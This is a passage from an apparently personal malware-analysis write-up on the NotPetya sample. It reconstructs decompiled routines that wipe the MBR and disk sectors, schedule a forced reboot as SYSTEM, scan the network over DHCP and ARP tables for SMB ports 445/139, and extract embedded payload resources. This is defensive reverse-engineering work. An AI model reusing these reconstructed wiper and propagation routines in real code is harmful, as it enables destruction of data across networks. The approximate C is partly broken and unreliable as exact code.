        success = DeviceIoControl(hDevice,IOCTL_DISK_GET_DRIVE_GEOMETRY,NULL,0,&lpOutBuffer,0x18,&lpBytesReturned,NULL);

        if((success != 0) && (lpBuffer = LocalAlloc(0,lpOutBuffer.BytesPerSector * 10), lpBuffer != NULL)){
            // Wipe out the second sector of the drive
            SetFilePointer(hDevice,lpOutBuffer.BytesPerSector,NULL,FILE_BEGIN);
            WriteFile(hDevice,lpBuffer,lpOutBuffer.BytesPerSector,&lpBytesReturned,NULL);
            LocalFree(lpBuffer);
        }

        CloseHandle(hDevice);
    }

    // If kaspersky is not present on the system and the MBR is successfully overridden return...
    if((globalAVFlags & 8) != 0) && (clean = overWriteMBR(), clean == 0) return;
    
    // ... else wipe the first 10 disk's sectors (make the drive unbootable)
    wipe10sectors();

    return;
}
```

#### scheduleShutdown
##### FUN_100084df
Let's now go back into `Ordinal_1`, and then into `FUN_100084df`. We can see some wsprintfW functions, along with a function to get the localtime, system directory and three other functions, and if that isn't enough, we can also see a shutdown command string. We can already tell that this functions schedules the shudown of the system, but let's also investigate the other two functions.

##### FUN_10006973
This function is really small, and easy to understand, it simply calculate the difference from the `globalTickCount` variable (the one created at the start of the malware), and the current ticks, effectively calculating the time the malware has been in execution. The return value is a bit odd, but it's not important:

```c
uint calculateMalwareUptime(){
    DWORD cuttentTicks;
    uint timeElapsed;
  
    currentTicks = GetTickCount();
    timeElapsed = (currentTicks - globalTicks) / 60000;

    return -(timeElapsed < globalIntArg) & globalIntArg - timeElapsed;
}
```

##### FUN_10008494
`FUN_10008494` is also really small and easy to understand. It returns 0 if we are running on a system from Windows XP downwards, 1 if we're running from Windows Vista onwards.

```c
int checkWindowsVersion(){
    BOOL success;
    int ret;
    OSVERSIONINFO lpVersionInfo;
    
    ret = 0;

    lpVersionInfo.dwOSVersionInfoSize = 0x114;
    success = GetVersionExW(&lpVersionInfo);

    // Ensure we're running from Windows Vista onwards
    if(success && lpVersionInfo.dwMajorVersion > 5) ret = 1;
    
    return ret;
}
```

##### FUN_100083bd
I'm not going to waste much time into this function, as I already saw the `CreateProcessW` function with familiar aguments. The function should look something like this:

```c
BOOL executeCmdCommand(int zero){
    WCHAR lpCmdLine[1024], lpApplicationName[780];
    STARTUPINFOW systemInfo;
    PROCESS_INFORMATION processInfo;
    
    /* The application name is formed by the system path appended by "\\cmd.exe" */
    
    /* The command line is formed by the shutdown command from the parent function */

    success = CreateProcessW(lpApplicationName,lpCmdLine,NULL,NULL,0,CREATE_NO_WINDOW,NULL,NULL,&systemInfo,&processInfo);
    
    /* Pointless sleep function... */

    return success;
}
```

##### FUN_100084df
Now we can also better understand the `FUN_100084df` function. It uses the malware uptime to schedule the shutdown, which is programmed on two different ways, for Windows XP users downwards, and Windows Vista upwards.
Also, if the malware has acquired the `SeTcbPrivilege` from the beginning, it schedules the shutdown as SYSTEM (Windows Vista upwards only). The cleaned up function should look like this:

```c
BOOL scheduleShutdown(){
    uint uptimeMask, len;
    BOOL success, windowsVista, shutdownScheduled = 0;
    wchar_t *lpPrivilege;
    uint shutdownHours, shutdownMinutes;

    WCHAR shutdownCommand[1023], lpSystemDir[780];
    SYSTEMTIME systemTime;
    
    // Get the localtime, and the malware uptime
    GetLocalTime(&systemTime);
    uptimeMask = calculateMalwareUptime();

    // Calculate the shutdown time
    if(uptimeMask < 10) uptimeMask = 10;

    shutdownHours = (systemTime.wHour + (uptimeMask + 3) / 0x3c) % 0x18;
    shutdownMinutes = systemTime.wMinute + (uptimeMask + 3) % 0x3c;

    len = GetSystemDirectoryW(lpSystemDir,0x30c);

    if(len != 0){
        success = PathAppendW(lpSystemDir,L"shutdown.exe /r /f");
        if (success) {
            windowsVista = checkWindowsVersion();

            // Command from Windows XP downwards
            if(!windowsVista) wsprintfW(shutdownCommand,L"at %02d:%02d %ws",shutdownHours,shutdownMinutes,lpSystemDir);
            
            // Command from Windows Vista upwards
            else {
                // If the process has the SeTcbPrivilege, it schedules the shutdown as SYSTEM.
                lpPrivilege = L"/RU \"SYSTEM\" ";
                if((globalPrivilegesMask & 4) == 0) lpPrivilege = L"";

                wsprintfW(shutdownCommand,L"schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%02d",lpPrivilege,lpSystemDir,shutdownHours,shutdownMinutes);
            }

            // Shutdown the system
            shutdownScheduled = executeCmdCommand(0);
        }
    }

    return shutdownScheduled;
}
```

#### enumerateNetDevices
##### Back to Ordinal_1
Now the malware creates a thread, and executes the routine at the address `0x10007c10`. Let's dive into it, shall we?

##### lpStartAddress_10007c10
We can instantly see the `globalLpCriticalSection1` getting passed into the `checkIfCmdLineNullOrDelay` function, so this suggests another small delay before the real function gets executed by a thread.

##### lpStartAddress_10008e7f
After we enter the function, a call to `GetAdapterInfo` is made, and the return value is checked in case of error. It turned out that this error is also needed to determine the structure size, just like we saw before in previous functions. After that, a do while loop is executed, and the IpAddress is passed inside a function called `Ordinal_11`, which is the `WS2_32.DLL`'s `inet_addr` function. Then all the valid addresses (probably all the network devices connected) are enumerated and saved into a buffer.

After that, we see a call to `FUN_10008243`.

##### FUN_10008243
This function is really small, all it does is simply checking if the PC is running in a primary or backup domain controller:

```c
DWORD checkIfPCIsRunningIsPrimaryOrBackupDomainController(){
    DWORD success, ret = 0;
    SERVER_INFO_101 *lpServerInfo101 = NULL;

    success = NetServerGetInfo(NULL,101,&lpServerInfo101);

    // Check if the software used by the computer is not a domain controller or if it's a backup or primary domain controller, in that case return 1, otherwise return 0
    if((success == NERR_Success) && ((Buffer->sv101_type & (SV_TYPE_SERVER_NT)) != 0 || (Buffer->sv101_type & (SV_TYPE_DOMAIN_CTRL | SV_TYPE_DOMAIN_BAKCTRL) != 0))) ret = 1;

    if(Buffer != NULL) NetApiBufferFree(Buffer);

    return ret;
}
```

##### FUN_1000908a
Going back into the parent function, we can see that if the PC is indeed running on a domain controller, it goes into `FUN_1000908a`.
Here we can see some DHCP related functions, such as `DhcpEnumSubnets`, `DhcpGetSubnetInfo`, `DhcpEnumSubnetClients` and `DhcpRpcFreeMemory`. We can also replace the Ordinal kind functions with the corresponding ones from the `WS2_32.DLL`. Let's check out `FUN_1000918a`.

##### FUN_1000918a
This function is rather small, it simply calls `FUN_1000a3f8` two times, and checks for a specific value. 

##### FUN_1000a3f8
Inside this function we can see some socket related functions, which all they really do is checking if it can connect to a port, and if it can returns 1, otherwise return 0.

```c
int checkIfPortBind(ULONG lpIPAddr,int lpPort){
    int sock, present, ret;
    fd_set socketDescriptors;

    sockaddr sockAddr;
    ULONG argp;
    timeval timeout;
    
    // Choose the protocol automatically
    sock = socket(AF_INET,SOCK_STREAM,0);

    if(sock != 0){
        sockAddr.sa_family = 2;

        // Port number and address
        sockAddr.sin_addr = lpIPAddr;
        sockAddr.sin_port = htons(lpPort);

        present = ioctlsocket(sock,0x8004667e,&argp);

        if(present != -1){
            connect(sock,&sockAddr,0x10);
            socketDescriptors.fd_count = 1
            socketDescriptors.fd_array[0] = sock;

            timeout.tv_sec = 2;
            timeout.tv_usec = 0;

            present = select(sock,0,&socketDescriptors,0,&timeout);
            if(present != -1){
                // Check if socket is included is socket descriptors
                present = __WSAFDIsSet(sock,&socketDescriptors);

                // If present
                if(present) ret = 1;
            }
        }

        closesocket(sock);
    }

    return ret;
}
```

##### Back to FUN_1000918a
Now we have a clear overview of what this function does:

```c
ULONG bindPort445andPort139(ULONG lpAddr){
    int included = checkIfPortBind(lpAddr,445);
    
    // If the malware can bind ports 445 and 139
    if((!included) && (included = checkIfPortBind(lpAddr,139), !included)) return 0;
    
    return 1;
}
```

##### FUN_10006916
Going back, inside `FUN_10006916` we see a call to the `MultiByteToWideChar` function, but with no exit parameter. We can assume it's only used to get the length of the UTF-8 converted string. When we go inside the if statement, heap is allocated with the double size of the UFF-8 string, confirming our though. Then the actual string is converted.

This function looks like this:

```c
LPWSTR convertIPToUTF_8(LPCSTR lpIPAddress){
    int lpNewSize;
    HANDLE hHeap;
    LPWSTR lpWideCharStr;
    
    // Get the length of the UTF-8 string
    lpNewSize = MultiByteToWideChar(CP_UTF8,0,lpIPAddress,-1,NULL,0);

    if(lpNewSize != 0){
        hHeap = GetProcessHeap();
        lpWideCharStr = (LPWSTR)HeapAlloc(hHeap,0,lpNewSize * 2);

        if((lpWideCharStr != NULL) && (lpNewSize = MultiByteToWideChar(CP_UTF8,0,lpIPAddress,-1,lpWideCharStr,lpNewSize), lpNewSize != 0)) return lpWideCharStr;
    }

    return NULL;
}
```

##### Back to FUN_1000908a
Now we also better understand what this function does, it uses the DHCP server to enumerate all the connected clients, and then checks if it can open a socket into them to connect into ports 445 and 139. Here is the ghidra decompilation:

```c
int enumerateClientsFromDHCP(LPCRITICAL_SECTION lpCriticalSection){
    DWORD success;
    ULONG lpTCPnum;
    ULONG included;
    undefined4 lpAddress;
    LPCSTR lpIPAddress;
    LPWSTR lpFinalAddr;
    HANDLE hHeap;
    uint index;
    uint i;
    WCHAR lpComputerName [260];
    DWORD clientTotal;
    uint totalIPAddresses;
    DWORD lpNameSize;
    uint clientNumber;
    DHCP_RESUME_HANDLE hDHCP;
    DHCP_RESUME_HANDLE hOutDHCP;
    DWORD lpTotalSubnets;
    DWORD clientNum;
    DWORD lpSubnetNumber;
    uint local_1c;
    uint j;
    LPDHCP_SUBNET_INFO lpSubnetInfo;
    LPDHCP_CLIENT_INFO_ARRAY lpClientInfo;
    LPDHCP_IP_ARRAY lpEnumArray [2];
    LPDHCP_CLIENT_INFO lpClient;
    
    index = 0;
    i = 0;
    hDHCP = 0;
    hOutDHCP = 0;
    lpEnumArray[0] = (LPDHCP_IP_ARRAY)0x0;
    lpSubnetInfo = (LPDHCP_SUBNET_INFO)0x0;
    lpClientInfo = (LPDHCP_CLIENT_INFO_ARRAY)0x0;
    local_1c = 0;
    j = 0;
    lpSubnetNumber = 0;
    lpTotalSubnets = 0;
    clientNum = 0;
    clientTotal = 0;
    lpNameSize = 0x104;

    // Get computer name over net
    GetComputerNameExW(ComputerNamePhysicalNetBIOS,lpComputerName,&lpNameSize);

    // Enum all subnets
    success = DhcpEnumSubnets(lpComputerName,&hDHCP,1024,lpEnumArray,&lpSubnetNumber,&lpTotalSubnets);
    if(success == 0){
        totalIPAddresses = lpEnumArray[0]->NumElements;
        if(totalIPAddresses != 0){
            do {
                // Get all the subnet info
                success = DhcpGetSubnetInfo((WCHAR *)0x0,lpEnumArray[0]->Elements[index],&lpSubnetInfo);
                if((success == ERROR_SUCCESS) && (lpSubnetInfo->SubnetState == DhcpSubnetEnabled)){

                    // Enumerates all the clients
                    success = DhcpEnumSubnetClients((WCHAR *)0x0,lpEnumArray[0]->Elements[index],&hOutDHCP,0x10000,&lpClientInfo,&clientNum,&clientTotal);
                    if(success == 0) {
                        clientNumber = lpClientInfo->NumElements;
                        if((clientNumber != 0) && (i < clientNumber)){
                            do {
                                // Check if the device can recieve data in ports 445 and 139
                                lpClient = lpClientInfo->Clients[i];
                                if(lpClient != (LPDHCP_CLIENT_INFO)0x0){
                                    lpTCPnum = htonl(lpClient->ClientIpAddress);
                                    included = bindPort445andPort139(lpTCPnum);
                                    if(included != 0){
                                        lpAddress = htonl(lpClient->ClientIpAddress);
                                        lpIPAddress = (LPCSTR)inet_ntoa(lpAddress);
                                        lpFinalAddr = convertIPToUTF_8(lpIPAddress);
                                        if(lpFinalAddr != (LPWSTR)0x0){
                                            checkIfCmdLineNullOrDelay(lpCriticalSection);
                                            success = 0;
                                            hHeap = GetProcessHeap();
                                            HeapFree(hHeap,success,lpFinalAddr);
                                        }
                                    }
                                }
                                i = j + 1;
                                j = i;
                            } while(i < clientNumber);
                        }
                        DhcpRpcFreeMemory(lpClientInfo);
                    }
                }
                index = local_1c + 1;
                local_1c = index;
            } while(index < totalIPAddresses);
        }

        DhcpRpcFreeMemory(lpEnumArray[0]);
    }

    return 0;
}
```

##### lpStartAddress_10008e04
Back to `lpStartAddress_10008e7f` address, we can also see the last unknown function, which is `lpStartAddress_10008e04`. Here we have all the function typed correctly, so after a bit of cleaning, the final thread function should look like this:

```c
int checkIfAllIpBindPorts445and139(LPCRITICAL_SECTION_DEBUG lpCriticalSection){
    ULONG TCPnum, TCPnum2;
    LPCSTR lpIPAddr, lpMem;
    CRITICAL_SECTION *actualNum, *lpMainCriticalSection;
    
    lpMainCriticalSection = lpCriticalSection->CriticalSection;

    for(actualNum = lpCriticalSection; actualNum < lpMainCriticalSection; actualNum = &actualNum->DebugInfo + 1){
        TCPnum = htonl(actualNum);
        TCPnum = bindPort445andPort139(TCPnum);

        if(TCPnum != 0){
            TCPnum2 = htonl(actualNum);
            lpIPAddr = inet_ntoa(TCPnum2);
            lpMem = convertIPToUTF_8(lpIPAddr);

            if(lpMem != NULL){
                checkIfCmdLineNullOrDelay(lpCriticalSection->ProcessLocksList.Flink);
                HeapFree(GetProcessHeap(),0,lpMem);
            }
        }
    }
    LocalFree(lpCriticalSection);

    return 0;
}
```

##### Back to lpStartAddress_10008e7f
Now we know what every function inside `lpStartAddress_10008e7f` does. We can now assume what this function does: it's enumerating all the devices on the network, checking for hosts that can receive data on ports 445 and 139. Cleaning up the code, and breaking down the functions into core pieces, this is the final result:

```c
int enumerateNetDevicesWithPorts445and139(LPCRITICAL_SECTION lpCriticalSection){
    ulong success0;
    IP_ADAPTER_INFO *AdapterInfo;
    LPWSTR lpUTF8IPAddr;

    HANDLE hHeap;
    int runningInDomainController, i, k, lpAddressContainer[2048];
    LPCRITICAL_SECTION lpCriticalSectionThread;

    SIZE_T dwSize;

    // Retrieve the adapter informations
    if((GetAdaptersInfo(NULL,&dwSize) == ERROR_BUFFER_OVERFLOW) && (AdapterInfo = LocalAlloc(0x40,dwSize), AdapterInfo != NULL)){
        success0 = GetAdaptersInfo(AdapterInfo,&dwSize);

        // Loop for max 1024 addresses
        if (success0 == 0) {
            do {
                if (i > 1023) break;

                /* Save the address into the container, then transform into a string */

                lpUTF8IPAddr = convertIPToUTF_8(AdapterInfo->IpAddressList.IpAddress.String);

                // Check for the address validity
                if(lpUTF8IPAddr != NULL){
                    checkIfCmdLineNullOrDelay(lpCriticalSection);
                    HeapFree(GetProcessHeap(),0,lpUTF8IPAddr);
                }

                // Check for address validity, again
                if((AdapterInfo->CurrentIpAddress != NULL) && (lpUTF8IPAddr = convertIPToUTF_8(AdapterInfo->IpAddressList.IpMask.String), lpUTF8IPAddr != NULL)){
                    checkIfCmdLineNullOrDelay(lpCriticalSection);
                    HeapFree(GetProcessHeap(),0,lpUTF8IPAddr);
                }

                AdapterInfo = AdapterInfo->ComboIndex;
                i++;

            } while (AdapterInfo != NULL);

            // Return 1 if it's running on domain vontroller
            runningInDomainController = checkIfPCIsRunningIsPrimaryOrBackupDomainController();

            if(runningInDomainController) enumerateClientsFromDHCP(lpCriticalSection);

            if(i != 0){
                do {
                    lpCriticalSectionThread = LocalAlloc(0x40,0xc);

                    if(lpCriticalSectionThread != NULL){

                        /* Agains, save the addresses into a buffer */

                        hHeap = CreateThread(NULL,0,checkIfAllIpBindPorts445and139,lpCriticalSectionThread,0,NULL);
                    }

                    k++;
                } while(k < i);
            }

            if(k != 0){

                /* Close some handles */

            }
        }   

        LocalFree(AdapterInfo);
    }

    return 0;
}
```

##### FUN_1000777b
Going back to `lpStartAddress_10007c10`, we have three last functions to analyze, the first one being `FUN_1000777b`.
This function is nothing new, it simply enumerates the network devices from the TCP table. The function should look something like this:

```c
bool enumerateDevicesFromTcpTable(LPCRITICAL_SECTION lpCriticalSection){
    FARPROC lpGetExtendedTcpTable;
    LPVOID pTcpTable;
    int success, i;

    byte *IPbyte;
    bool ret;
    SIZE_T dwBytes;

    WCHAR lpFinalIp[32];
    HMODULE hIphlpapi;
    PDWORD pSize;
    
    ret = false;
    hIphlpapi = LoadLibraryW(L"iphlpapi.dll");
    if(hIphlpapi != NULL){
        lpGetExtendedTcpTable = GetProcAddress(hIphlpapi,"GetExtendedTcpTable");

        pSize = 0x100000;

        // Allocate heap for the struct
        pTcpTable = HeapAlloc(GetProcessHeap(),8,0x100000);

        if(pTcpTable != NULL){
            success = (*lpGetExtendedTcpTable)(pTcpTable,&pSize,0,AF_INET,1,0);
            ret = success == 0;
            
            if(ret && (i = 0, *pTcpTable != 0)){

                /* Get the IP bytes */

                do {
                    // Concatenate the IP address
                    wsprintfW(lpFinalIp,L"%u.%u.%u.%u",(uint)IPbyte[-2],(uint)IPbyte[-1],IPbyte,IPbyte[1]);

                    // Delay
                    checkIfCmdLineNullOrDelay(lpCriticalSection);
                
                } while(i < *pTcpTable);
            }

            HeapFree(GetProcessHeap(),0,pTcpTable);
        }

        FreeLibrary(hIphlpapi);
    }

    return ret;
}
```

##### FUN_1000786b
Let's now investigate into `FUN_1000786b`. We can start to see a pattern here, it's the same as the previous function, but this time it's enumerating the devices with `GetIpNetTable`. After cleaning up the code it should look something like this:

```c
int enumerateDevicesWithNetTable(LPCRITICAL_SECTION lpCriticalSection){
    int tableStatus, ret = 0, i;
    MIB_IPNETTABLE *lpNetTable;
    byte *IPbyte;

    WCHAR finalIp[32];
    SIZE_T lpSize = 0;

    tableStatus = GetIpNetTable(0,&lpSize,0);
    
    // No IPv4 physiscal address mapping
    if(tableStatus == ERROR_NO_DATA) ret = 0;

    // Allocate the buffer size with the structure
    else if(tableStatus == ERROR_INSUFFICIENT_BUFFER){
        lpNetTable = HeapAlloc(GetProcessHeap(),0,lpSize);
        if(lpNetTable != NULL){
            
            tableStatus = GetIpNetTable(lpNetTable,&lpSize,0);
            if(tableStatus == 0){
                ret = 1;
                i = 0;

                // Enumerate all the IP into the table
                if(lpNetTable->dwNumEntries != 0){
                    IPbyte = &lpNetTable->table[0].dwAddr;

                    do {
                        /* Bytes smt... */

                        wsprintfW(finalIp,L"%u.%u.%u.%u",IPbyte[-2],IPbyte[-1],*IPbyte,IPbyte[1]);
                        checkIfCmdLineNullOrDelay(lpCriticalSection);

                        i++;
                    } while(i < lpNetTable->dwNumEntries);
                }
            }

            HeapFree(GetProcessHeap(),0,lpNetTable);
        }
    }

    return ret;
}
```

##### FUN_1000795a
Next up we have `FUN_1000795a`.

The first thing we see it that this function is recursive. We can also see that a call to `NetServerEnum` is made. Then we see that a check is made on the platform id, in particular if it's `PLATFORM_ID_NT`, meaning if the OS is from Windows NT family. The other things are not relevant, so we can summarize the function like this:

```c
LPCWSTR enumerateDeviceFromNetServer(LPCRITICAL_SECTION lpCriticalSection,DWORD serverType,LPCWSTR lpDomainName){
    int ret, i;
    LPWSTR *sv101_name;
    DWORD lpTotalEntries = 0, lpEnumEntries = 0;

    SERVER_INFO_101 *lpBuffer;

    // Get the SERVER_INFO_101 struct
    ret = NetServerEnum(0,101,&lpBuffer,MAX_PREFERRED_LENGTH,&lpEnumEntries,&lpTotalEntries,serverType,lpDomainName,NULL);

    if((ret == 0) || (ret == ERROR_MORE_DATA)){
        lpDomainName = 1;
        if(lpBuffer == NULL) return 1;

        i = 0;

        if(lpEnumEntries != 0){
            sv101_name = &lpBuffer->sv101_name;

            do {
                if(sv101_name == 4) break;

                // The main important check if the platform is Windows NT
                if(sv101_name->sv101_platform_id == PLATFORM_ID_NT) checkIfCmdLineNullOrDelay(lpCriticalSection);

                // Recursive call
                else enumerateDeviceFromNetServer(lpCriticalSection,3,*sv101_name);

                i++;
            } while(i < lpEnumEntries);
        }
    }
    else lpDomainName = 0;

    if(lpBuffer != NULL) NetApiBufferFree(lpBuffer);

    return lpDomainName;
}
```

##### Back to lpStartAddress_10007c10
Now we can properly discuss the `lpStartAddress_10007c10` thread function. After some delays, it gets the NetBIOS computer name, and checks for devices in the same network with ports 445 and 139 open. Then an infinite while loop is entered, in which every three minutes devices gets enumerated from the TCP table, Net table, and NetServer (only the first time). The cleaned up code should look like the following:

```c
void enumerateNetDevices(){
    LPCRITICAL_SECTION lpCriticalSection;
    BOOL success, noNetServer = false;
    WCHAR lpComputerName[260];

    DWORD lpNameSize;
    
    // Small delay before the actual function
    lpCriticalSection = globalLpCriticalSection1;
    checkIfCmdLineNullOrDelay(globalLpCriticalSection1);
    checkIfCmdLineNullOrDelay(lpCriticalSection);

    lpNameSize = 0x104;
    
    // Get the computer name over the net
    success = GetComputerNameExW(ComputerNamePhysicalNetBIOS,lpComputerName,&lpNameSize);
    
    // Delay even more
    if(!success) checkIfCmdLineNullOrDelay(lpCriticalSection);

    // Enumerate devices with ports 445 and 139 open
    CreateThread(NULL,0,enumerateNetDevicesWithPorts445and139,lpCriticalSection,0,NULL);

    do {
        // Enumerate devices from TCP table, Net table, and Net server
        enumerateDevicesFromTcpTable(lpCriticalSection);
        enumerateDevicesWithNetTable(lpCriticalSection);
        if (!noNetServer) {
            enumerateDeviceFromNetServer(lpCriticalSection,SV_TYPE_DOMAIN_ENUM,NULL);
            noNetServer = true;
        }
        
        // Sleep for 3 minutes
        Sleep(180000);
    } while(true);
}
```

#### dropResourceAndPipeIntoIt
##### FUN_10007545
Now, back to the main malware function, we can see that the malware checks if `SeShutdownPrivilege` and `SeDebugPrivilege` were acquired. in this case, a call to `FUN_10007545` is made. Let's go inside it.

The first thing we see is that it gets a handle to `Kernel32.dll`, followed by the address of `IsWow64Process`. Then, a check is made on the current process to see if it's running on x64 o x86. Then, the malware looks for an embedded resource, which is the number 1 if the process is x64, the number 2 if the process is x86. Then we can see a call to `FUN_100085d0`, `GetTempPathW` and `GetTempFileNameW`. All those calls suggests the malware is dropping some files in the temp directory.

There are other functions called, but we should look into the undefined functions first.

##### FUN_100085d0
Our previous suspects get confirmed when we look inside `FUN_100085d0`, in which we see `LoadResource`, `LockResource`, `SizeofResource`, and `FUN_1000a520`. This function may be the dropper. Let's check it out.

##### FUN_1000a520, FUN_1000bb31, FUN_1000baa4, FUN_1000bb48, FUN_1000bbbf, FUN_1000bbea, FUN_1000a5cc, FUN_1000ba60, FUN_1000bf51, FUN_1000bf73, FUN_1000bd21 FUN_1000a5a8
Here we see a call to three other functions, in which we see some strange logic, either inside them, or in their subfunctions. But when we go inside `FUN_1000a5cc` we see some interesting strings: `"incorrect header check"`, `"invalid window size"`, `"unknown compression method"`.

It seems like it's related to some kind of archive extraction. Maybe all the functions are related to that? We might never know...
Also, we can see a string `"1.2.8"` passed as a parameter to `FUN_1000bb31`.

##### Extracting resources
Right now, we have no better choises but to check for resources inside the dll. A great tool for doing that is called `binwalk`. Let's run it and check its output:

```
chry@DESKTOP-LTE52TI:~/Documents/reverse-engineering/NotPetya/Sample/Dropped$ binwalk perfc.dat 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Microsoft executable, portable (PE)
53088         0xCF60          CRC32 polynomial table, little endian
57184         0xDF60          CRC32 polynomial table, big endian
61463         0xF017          Copyright string: "Copyright 1995-2013 Mark Adler "
84000         0x14820         Microsoft executable, portable (PE)
90208         0x16060         Microsoft executable, portable (PE)
105196        0x19AEC         Zlib compressed data, best compression
130156        0x1FC6C         Zlib compressed data, best compression
157584        0x26790         Zlib compressed data, best compression
349192        0x55408         Zlib compressed data, best compression
356360        0x57008         Object signature in DER format (PKCS header length: 4, sequence length: 5993
356509        0x5709D         Certificate in DER format (x509 v3), header length: 4, sequence length: 1120
357633        0x57501         Certificate in DER format (x509 v3), header length: 4, sequence length: 1146
358783        0x5797F         Certificate in DER format (x509 v3), header length: 4, sequence length: 1181
359968        0x57E20         Certificate in DER format (x509 v3), header length: 4, sequence length: 1194
```

We can see that our suspects get confirmed when we execute `binwalk`, as it immediately tells us that 4 possible signatures of Zlib compressed data were found on the dll. But that may also be a false positive. Well, `binwalk` also detected a copyright signature, `"Copyright 1995-2013 Mark Adler"`. After a quick search on the net I found that this is nothing more that the zlib licence. Here we have it, we made sense of all those strange functions, they are likely related to the zlib extractor.

Another great tool to analyze and extract binaries is `wrestool`. We can also see the resource name here. Let's run it on our dll:

```
chry@DESKTOP-LTE52TI:~/Documents/reverse-engineering/NotPetya/Sample/Dropped$ wrestool perfc.dat 

--type=10 --name=1 --language=1033 [type=rcdata offset=0x200e8 size=24958]
--type=10 --name=2 --language=1033 [type=rcdata offset=0x26268 size=27426]
--type=10 --name=3 --language=1033 [type=rcdata offset=0x2cd8c size=191605]
--type=10 --name=4 --language=1033 [type=rcdata offset=0x5ba04 size=3379]
```

Yeah, there is not much to say here. We can also see the resource offset here, so we know where the resource is located. As much as I'd like to extract the resource number 1 directly, we can see that on `wrestool` the offset of the resource is `0x200e`, while on `binwalk` the first zlib resource offset is at `0x1FC6C`. Let's extract all resources, and run file on them:

```
chry@DESKTOP-LTE52TI:~/Documents/reverse-engineering/NotPetya/Sample/Dropped$ binwalk -e perfc.dat 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Microsoft executable, portable (PE)
53088         0xCF60          CRC32 polynomial table, little endian
57184         0xDF60          CRC32 polynomial table, big endian
61463         0xF017          Copyright string: "Copyright 1995-2013 Mark Adler "
84000         0x14820         Microsoft executable, portable (PE)
90208         0x16060         Microsoft executable, portable (PE)
105196        0x19AEC         Zlib compressed data, best compression
130156        0x1FC6C         Zlib compressed data, best compression
157584        0x26790         Zlib compressed data, best compression
349192        0x55408         Zlib compressed data, best compression
356360        0x57008         Object signature in DER format (PKCS header length: 4, sequence length: 5993
356509        0x5709D         Certificate in DER format (x509 v3), header length: 4, sequence length: 1120
357633        0x57501         Certificate in DER format (x509 v3), header length: 4, sequence length: 1146
358783        0x5797F         Certificate in DER format (x509 v3), header length: 4, sequence length: 1181
359968        0x57E20         Certificate in DER format (x509 v3), header length: 4, sequence length: 1194

chry@DESKTOP-LTE52TI:~/Documents/reverse-engineering/NotPetya/Sample/Dropped$ ls
perfc.dat  perfc.dat.extracted

chry@DESKTOP-LTE52TI:~/Documents/reverse-engineering/NotPetya/Sample/Dropped$ cd perfc.dat.extracted/
chry@DESKTOP-LTE52TI:~/Documents/reverse-engineering/NotPetya/Sample/Dropped/perfc.dat.extracted$ ls
19AEC  19AEC.zlib  1FC6C  1FC6C.zlib  26790  26790.zlib  55408  55408.zlib

chry@DESKTOP-LTE52TI:~/Documents/reverse-engineering/NotPetya/Sample/Dropped/perfc.dat.extracted$ file *.zlib
19AEC.zlib: zlib compressed data
1FC6C.zlib: zlib compressed data
26790.zlib: zlib compressed data
55408.zlib: zlib compressed data
```

As we can see, they are all perfectly detected as zlib archives. Now we just need to extract the zlib archives to reveal the files. To do that we can use `Detect It Easy`, not just because it can extract zlib files, but it can also give us usefull pieces of information about the files inside and the archive size, which we can confront with the resource size given us by `wrestool`.

Anyways, `Detect It Easy` tells us those details:
- `1FC6C.zlib`: size `226.76 KiB`, contains a `PE64` file inside (matches resource's 1 arch)
- `19AEC.zlib`: size `251.14 KiB`, contains a `PE32` file inside
- `26790.zlib`: size `226.76 KiB`, contains a `PE32` file inside (matches resource's 3 size)
- `1FC6C.zlib`: size `226.76 KiB`, contains `binary` data inside

Unfortunately all the resource sizes doesn't match at all, except for resource 3. Resource 1 is a `PE64`, meaning it matches resource 1 architecture according to ghidra's previous function decompilation. We assume that resource 1 and 2 are `1FC6C.zlib` and `19AEC.zlib`, just because they have different architectures, and they are both executables.

Anyways, for now, let's rename the archives:
- `1FC6C.zlib`: `res1.gzip`
- `19AEC.zlib`: `res2.gzip`
- `26790.zlib`: `res3.gzip`
- `1FC6C.zlib`: `res4.gzip`

##### Back to analysis
We're going to check out those files in a minutes, but first let's finish to analyze `FUN_10007545` and its functions.
`FUN_1000a520` should just be the function to extract the given resource, but the parameters are not so easy to understand, so let's check out the other functions too.

##### FUN_100070fa
`FUN_100073ae` however, is quite easy to understand, so after a bit of cleaning we get this pretty straighforward function:

```c
int writeMemoryToHiddenFile(LPCWSTR strFileName,LPCVOID lpFileBuff){
    HANDLE hFile;
    BOOL success;
    LPCWSTR dwFileSize;

    int ret = 0;

    // Create a hidden file
    hFile = CreateFileW(strFileName,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);

    if(hFile != NULL){
        // Write the content of the lpFileBuff inside it
        success = WriteFile(hFile,lpFileBuff,dwFileSize,&strFileName,NULL);
    
        // If the size matches and the file is written, return 1
        if((success != 0) && (dwFileSize == (DWORD)strFileName)) ret = 1;
        
        CloseHandle(hFile);
    }

    return ret;
}
```

##### FUN_100070fa
Checking out `FUN_100070fa` reveals just a call to assign value 1 to the semaphore, which effectively locks it. We'll rename this function to `lockSemaphore`.

```c
int lockSemaphore(){
    LPCRITICAL_SECTION lpCriticalSection;
    
    if(lpCriticalSection != NULL){
        EnterCriticalSection(lpCriticalSection);

        // lpCriticalSection[1]->LockSemaphore = 1, done in an atomic way (notice the critical section)
        InterlockedExchange(&lpCriticalSection[1].LockSemaphore,1);
        LeaveCriticalSection(lpCriticalSection);

        return 1;
    }

    return 0;
}
```

##### FUN_100085d0
Now we can finally guess what this function does, it just extract the file, and have the extracted file in memory:

```c
int loadAndExtractResource(LPVOID lpResourceBuffer,HRSRC hRscs_lpResource){
    HGLOBAL hResData;
    LPVOID lpResource, lpMemory;
    DWORD dwResSize;

    int extracted, ret = 0;

    // Load the resource
    hResData = LoadResource(hCurrentModule,hRscs_lpResource);

    // Lock it, and allocate its size
    if(((hResData != NULL) && (lpResource = LockResource(hResData), lpResource != NULL)) && (dwResSize = SizeofResource(hCurrentModule,hRscs_lpResource), dwResSize != 0)){
        // Allocate the memory to hold it
        lpMemory = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,*lpResource);
        
        if(lpMemory != NULL){
            // Get the extracted resource into memory
            hRscs_lpResource = *lpResource;
            extracted = extractResource(success,&hRscs_lpResource,lpResource,dwResSize);
            
            // If the resource was successfully extracted
